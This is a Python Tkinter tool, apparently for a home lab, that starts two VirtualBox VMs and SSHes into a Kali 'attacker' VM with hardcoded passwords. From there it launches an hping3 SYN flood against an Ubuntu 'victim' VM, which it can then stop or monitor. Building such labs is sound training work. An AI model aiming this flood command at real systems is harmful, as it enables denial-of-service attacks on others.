import subprocess
import time
import threading
import paramiko
import platform
import os
import tkinter as tk
from tkinter import scrolledtext

def get_vm_ip(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.PIPE).decode().strip()
        # Clean up the result if necessary (i.e., remove any unwanted strings)
        if result.startswith("Value:"):
            return result.split(":")[1].strip()
        else:
            return "IP not found"
    except subprocess.CalledProcessError as e:
        return f"Error: {e}"

#(replace with actual values)
vm_attacker = "kali-linux-2024.3-virtualbox-amd64"
attacker_user = "kali"
attacker_pass = "kali"

vm_victim = "ubuntuDesktop"
victim_user = "Shields"
victim_pass = "1234"

attacker_ip_command = "VBoxManage guestproperty get {} /VirtualBox/GuestInfo/Net/0/V4/IP".format(vm_attacker)
victim_ip_command = "VBoxManage guestproperty get {} /VirtualBox/GuestInfo/Net/0/V4/IP".format(vm_victim)

attacker_ip = get_vm_ip(attacker_ip_command)
victim_ip = get_vm_ip(victim_ip_command)

print(attacker_ip)
print(victim_ip)

def find_vboxmanage():
    """Find the VBoxManage executable automatically."""
    if platform.system() == "Windows":
        possible_paths = [
            r"C:\Program Files\Oracle\VirtualBox\VBoxManage.exe",
            r"C:\Program Files (x86)\Oracle\VirtualBox\VBoxManage.exe"
        ]
    elif platform.system() == "Darwin":  # macOS
        possible_paths = ["/Applications/VirtualBox.app/Contents/MacOS/VBoxManage"]
    else:  # Linux
        possible_paths = ["/usr/bin/VBoxManage", "/usr/local/bin/VBoxManage"]

    for path in possible_paths:
        if os.path.exists(path):
            return path  # Found it!

    return None  # Not found
def configure_vms():
    log_message("Configuring VMs with Host-Only Adapter...")
    subprocess.run(["VBoxManage", "modifyvm", vm_attacker, "--nic1", "hostonly", "--hostonlyadapter1", "VirtualBox Host-Only Ethernet Adapter"])
    subprocess.run(["VBoxManage", "modifyvm", vm_victim, "--nic1", "hostonly", "--hostonlyadapter1", "VirtualBox Host-Only Ethernet Adapter"])
    log_message("VMs configured with Host-Only Adapter.")
    
# Function to log messages in the UI
def log_message(msg):
    log_text.insert(tk.END, msg + "\n")
    log_text.see(tk.END)
    
def power_off_vms():
    log_message("Powering off VMs...")
    subprocess.run(["VBoxManage", "controlvm", vm_attacker, "poweroff"])
    subprocess.run(["VBoxManage", "controlvm", vm_victim, "poweroff"])
    log_message("VMs powered off.")
    
# Start VMs
def start_vms():
    log_message("Starting VMs...")
    subprocess.run(["VBoxManage", "startvm", vm_attacker, "--type", "headless"])
    subprocess.run(["VBoxManage", "startvm", vm_victim, "--type", "headless"])
    log_message("VMs started. Waiting for boot...")
    time.sleep(30)  # Adjust for boot time
    log_message("VMs are ready.")

# Start DDoS Attack
def start_attack():
    log_message("Connecting to attacker VM...")
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(attacker_ip, username=attacker_user, password=attacker_pass)
        
        attack_command = f"sudo hping3 -S --flood -p 80 {victim_ip}"
        log_message("Launching attack...")
        
        ssh.exec_command(attack_command)
        log_message(f"Attacking {victim_ip} from {attacker_ip}...")
        ssh.close()
    except Exception as e:
        log_message(f"Error: {e}")

# Stop Attack
def stop_attack():
    log_message("Stopping attack...")
    
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(attacker_ip, username=attacker_user, password=attacker_pass)
        
        ssh.exec_command("pkill hping3")
        log_message("Attack stopped.")
        ssh.close()
    except Exception as e:
        log_message(f"Error: {e}")

# Monitor Victim VM
def monitor_victim():
    log_message("Connecting to victim VM to monitor network...")

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(victim_ip, username=victim_user, password=victim_pass)
        
        stdin, stdout, stderr = ssh.exec_command("netstat -antp | grep ESTABLISHED")
        
        log_message("Victim's active connections:\n" + stdout.read().decode())
        ssh.close()
    except Exception as e:
        log_message(f"Error: {e}")

print(find_vboxmanage())
# Create GUI
root = tk.Tk()
root.title("VM DDoS Simulator")

frame = tk.Frame(root)
frame.pack(pady=20)

# Buttons
btn_start_vms = tk.Button(frame, text="Start VMs", command=lambda: threading.Thread(target=start_vms).start())
byn_configure_vms = tk.Button(frame, text="Configure VMs", command=lambda: threading.Thread(target=configure_vms).start())
btn_start_attack = tk.Button(frame, text="Start Attack", command=lambda: threading.Thread(target=start_attack).start())
btn_stop_attack = tk.Button(frame, text="Stop Attack", command=lambda: threading.Thread(target=stop_attack).start())
btn_monitor = tk.Button(frame, text="Monitor Victim", command=lambda: threading.Thread(target=monitor_victim).start())
btn_off_vms = tk.Button(frame, text="Power Off VMs", command=lambda: threading.Thread(target=power_off_vms).start())

btn_start_vms.grid(row=0, column=0, padx=5)
byn_configure_vms.grid(row=0, column=1, padx=5)
btn_start_attack.grid(row=0, column=2, padx=5)
btn_stop_attack.grid(row=0, column=3, padx=5)
btn_monitor.grid(row=0, column=4, padx=5)
btn_off_vms.grid(row=0, column=5, padx=5)

# Log Output
log_text = scrolledtext.ScrolledText(root, width=60, height=20)
log_text.pack(pady=10)

root.mainloop()
